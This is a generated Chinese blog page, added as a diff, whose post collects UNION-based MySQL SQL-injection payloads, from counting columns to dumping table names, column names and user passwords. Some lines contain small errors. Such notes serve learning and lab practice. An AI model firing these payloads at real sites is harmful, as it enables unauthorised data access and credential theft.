@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>整理常见的 SQL 注入语句 - Boo</title>
+  
+    <meta name="keywords" content="Mysql,Web 安全">
+  
+  
+    <meta name="description" content="这篇笔记的目的是整理各种 SQL 注入使用时的payload。">
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Boo">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css">
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  <div class="cover-wrapper">
+    
+      <cover class='cover post half'>
+        <div class='cover-body'>
+  <div class='a'>
+    
+    
+      <p class="title">Boo's Blog</p>
+    
+    
+      <p class="subtitle">Stay foolish, Stay hungry</p>
+    
+  </div>
+  <div class='b'>
+    
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <input type="text" class="input u-search-input" placeholder="" />
+          <i class="icon fas fa-search fa-fw"></i>
+        </form>
+      </div>
+    
+    <div class='menu navigation'>
+      <ul class='cover-list-h'>
+        
+          
+            <li>
+              <a class="nav home"
+                href="https://www.0x2BeAce.com/"
+                
+                
+                id="https:www0x2BeAcecom">
+                <i class='fas fa-book fa-fw'></i>博客
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://www.0x2BeAce.com/categories/"
+                
+                
+                id="https:www0x2BeAcecomcategories">
+                <i class='fas fa-rss fa-fw'></i>分类
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://www.0x2BeAce.com/tags/"
+                
+                
+                id="https:www0x2BeAcecomtags">
+                <i class='fas fa-play-circle fa-fw'></i>标签
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://www.0x2BeAce.com/archives/"
+                
+                  rel="external nofollow noopener noreferrer"
+                
+                
+                id="https:www0x2BeAcecomarchives">
+                <i class='fas fa-file-code fa-fw'></i>归档
+              </a>
+            </li>
+          
+            <li>
+              <a class="nav home"
+                href="https://www.0x2BeAce.com/about/"
+                
+                
+                id="https:www0x2BeAcecomabout">
+                <i class='fas fa-handshake fa-fw'></i>关于我
+              </a>
+            </li>
+          
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+      </cover>
+    
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            Boo's Blog
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+  </div>
+
+
+  <div class="l_body">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/organize-common-sql-injection-statements/">
+      整理常见的 SQL 注入语句
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://www.0x2BeAce.com" rel="nofollow">
+    <img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg">
+    <p>Boo</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/Mysql/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>Mysql</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Jul 22, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>417 words</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>1 min</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="/organize-common-sql-injection-statements/" class="leancloud_visitors" data-flag-title="整理常见的 SQL 注入语句">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <p>这篇笔记的目的是整理各种 SQL 注入使用时的<code>payload</code>。</p>
+<a id="more"></a>
+
+<blockquote>
+<p>说明：以下的<code>payloads</code>都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p>
+</blockquote>
+<p>也就是基于这样一种情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;;</span><br></pre></td></tr></table></figure>
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ol>
+<li>判断当前数据表中有几列：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>查看显示位在第几列：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：这里需要传递一个不存在的条件，比如：<code>id=-1</code></p>
+</blockquote>
+<ol start="3">
+<li>显示当前数据库（假设显示位中包含第三位）：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>查看当前数据库中的所有表：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>函数<code>group_concat()</code>把所有结果都在一行输出</p>
+</blockquote>
+<ol start="5">
+<li>查询所有数据库：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>查询某个数据库中的表：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><p>查询某个表中的所有字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查询某个表中的字段内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0x3a会被转义位冒号<code>：</code></p>
+</blockquote>
+</li>
+</ol>
+<h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ca0y1h.top/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Web安全学习之数据库注入语句的收集和学习</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+          
+        
+          
+            <p>本文永久链接是：<a href=https://www.0x2beace.com/organize-common-sql-injection-statements/>https://www.0x2beace.com/organize-common-sql-injection-statements/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+    
+    
+
+<section class="widget qrcode  desktop mobile">
+  
+
+  <div class='content article-entry'>
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          
+<div class='new-meta-item author'>
+  <a href="https://www.0x2BeAce.com" rel="nofollow">
+    <img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg">
+    <p>Boo</p>
+  </a>
+</div>
+
+        
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2022-02-13T17:12:57+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Feb 13, 2022</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Mysql/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Mysql</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Web-%E5%AE%89%E5%85%A8/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Web 安全</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.0x2beace.com/organize-common-sql-injection-statements/&title=整理常见的 SQL 注入语句 - Boo&summary=这篇笔记的目的是整理各种 SQL 注入使用时的payload。"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer"
+          
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://www.0x2beace.com/organize-common-sql-injection-statements/&title=整理常见的 SQL 注入语句 - Boo&summary=这篇笔记的目的是整理各种 SQL 注入使用时的payload。"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer"
+          
+          href="http://service.weibo.com/share/share.php?url=https://www.0x2beace.com/organize-common-sql-injection-statements/&title=整理常见的 SQL 注入语句 - Boo&summary=这篇笔记的目的是整理各种 SQL 注入使用时的payload。"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/weibo.png">
+          
+        </a>
+      
+    
+      
+        
+        <div class='hoverbox'>
+          <a><img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/logo/128/wechat.png"></a>
+          <div class='target'>
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATgAAAE4CAAAAADqFLC2AAADr0lEQVR42u3aQXIbMQwEQP//08k9Lpc4A64MO82brOWSbPowBejjj1GNDwTgwIEDZ4ADtwTuoxxfzT99b7v+v/NefZ6u92k+OHDgwIEDBw7cMrjjAPjF8+1BXq3z6iDtPtrzggMHDhw4cODAbYVLg2e68VOg0yB7+t5b5wUHDhw4cODAgfstcO1BXwXpNqi2+wcHDhw4cODAgftf4drGc9pAfqqRDQ4cOHDgwIED99Ph4gbtZdi2oZ02ur+9kw8OHDhw4MCBA3cJ7nag3P65Pi84cODAgQMHDtwSuOmYbuTW+28F3pf7AQcOHDhw4MCBWwKXLpwG4rSgOW04376AugIMDhw4cODAgQP3Jrh3bygNrLca3+MLBQcOHDhw4MCBWwKXFv7SwJjOTyHTgN6uBw4cOHDgwIEDtw2u3cDTwbm9qLRAGn8PDhw4cODAgQO3BO7WQdrge6sxnV5Q+zw4cODAgQMHDtwWuHZjt4Pz7Qs4fW8c3MGBAwcOHDhw4JbAxQGwDMqvDnIK1gK2Axw4cODAgQMHbjvcaQCcHvQUoi2g3g7w4MCBAwcOHDhwPw1uGjDTQmQKMW1kt41rcODAgQMHDhy4LXBpAJw2iKfrtQXLaYEUHDhw4MCBAwduG1y7wdvPtz8sPA3S6YXHPywEBw4cOHDgwIF7M9xTC6cba983bYTHhVZw4MCBAwcOHLglcKdg04bzrc+3AnP9DwMOHDhw4MCBA7cELg2YaWExhUwb4S1UfV5w4MCBAwcOHLilcNMCZ3qQafBtC6n1DxHBgQMHDhw4cOCWwB03Yg//nsKmF3A7kMeFUXDgwIEDBw4cuCVwbUEwLQy2gXNceBzu/9NncODAgQMHDhy4ZXBTiDaQTt83vZjHKsDgwIEDBw4cOHAPw7VBsl04bTyn848LkmUBFhw4cODAgQMHbitc23hOA2j7/NPB/eX34MCBAwcOHDhwS+DedeAU5nT+tKEew4MDBw4cOHDgwC2Bm45bB3t3AE/XAwcOHDhw4MCB2wb3UY60MDhtCE8LntNGNDhw4MCBAwcO3Fa4NPC2wfipwmMK3AZ4cODAgQMHDhy4rXDtRk8DcRuM2+B6K+CDAwcOHDhw4MD9Nrh0Xgt9C3hcCAUHDhw4cODAgftlcO3300JnGqzTeccNaXDgwIEDBw4cuG+Ge6ohfavg2AbhW4VYcODAgQMHDhy4bXDThm37XFsgvdWojguy4MCBAwcOHDhwS+CMbIADBw4cOAMcuG8efwHDXwTb8CSwRgAAAABJRU5ErkJggg==">
+          </div>
+        </div>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/php-uses-hash-hmac-encryption/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>PHP 中使用 hash_hmac 加密</p>
+                <p class='content'>今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用Node写的，需要翻译成PHP 版本的。
+
+
+PHP中使用 Hmac 方法生成带有密钥的哈希值在Node.js 中，这是...</p>
+              </a>
+            
+            
+              <a class='next' href='/know-common-ways-of-sql-injection/'>
+                <p class='title'>认识SQL 注入常见方式<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>最近需要做一个检测SQL 注入的功能，无奈发现自己于对SQL 注入竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。
+
+
+SQL 注入是什么？SQL 注入是一种将S...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: '整理常见的 SQL 注入语句',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload"><span class="toc-text">Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Union"><span class="toc-text">Union</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+  
+    <meting-js
+      theme='#1BCDFC'
+      autoplay='false'
+      volume='0.7'
+      loop='all'
+      order='list'
+      fixed='false'
+      list-max-height='340px'
+      server='netease'
+      type='playlist'
+      id='3175833810'
+      list-folded='true'>
+    </meting-js>
+  
+
+
+        </div>
+      
+    
+      
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        Use
+        <a href="https://volantis.js.org/" target="_blank" class="codename">Volantis</a>
+        as theme, total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="https://www.0x2BeAce.com">Copyright © 2020-2021 Boo</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js"></script>
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0/dist/Meting.min.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "Ki6kd5TUWoQyYKSErxehnRpc-MdYXbMMI",
+    appKey: "7pRBOKMw58Yo7EsUjHziIEY1",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'false',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 标准 markdown 描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
